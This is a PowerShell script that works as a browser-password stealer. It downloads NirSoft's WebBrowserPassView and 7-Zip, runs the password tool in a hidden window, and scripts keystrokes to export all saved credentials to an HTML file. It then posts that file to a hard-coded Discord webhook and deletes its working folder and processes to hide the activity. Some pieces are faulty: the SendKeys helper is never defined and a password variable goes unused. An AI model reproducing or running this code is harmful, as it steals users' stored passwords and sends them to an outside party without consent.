$tmpfolder = "C:\temp"

if (Test-Path $tmpfolder) { 
    Remove-Item $tmpfolder -Recurse -Force 
}

mkdir $tmpfolder
Set-Location $tmpfolder

Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip' -OutFile 'wbpv.zip'
Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'

Expand-Archive '7z.zip'
& '.\7z\7za.exe' e 'wbpv.zip'

$extractionPassword = 'wbpv28821@'

Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden

Start-Sleep -Seconds 3
SendKeys '^(a)'  # CTRL + A
Start-Sleep -Seconds 3
SendKeys '^(s)'  # CTRL + S
Start-Sleep -Seconds 3
SendKeys 'export.html'  # File name
SendKeys '{TAB}'  # Move to save button
SendKeys 'h'  # Hit save
Start-Sleep -Seconds 1
SendKeys '%{F4}'  # ALT + F4 to close the application

$webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
$filePath = 'C:\temp\export.html'

Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = Get-Item $filePath }

Set-Location 'C:\temp'
$tmpfolder = 'C:\temp'
Remove-Item -Recurse -Force $tmpfolder

TASKKILL /IM /F "7z.exe"
TASKKILL /IM /F "7za.exe"
TASKKILL /IM /F "powershell.exe"
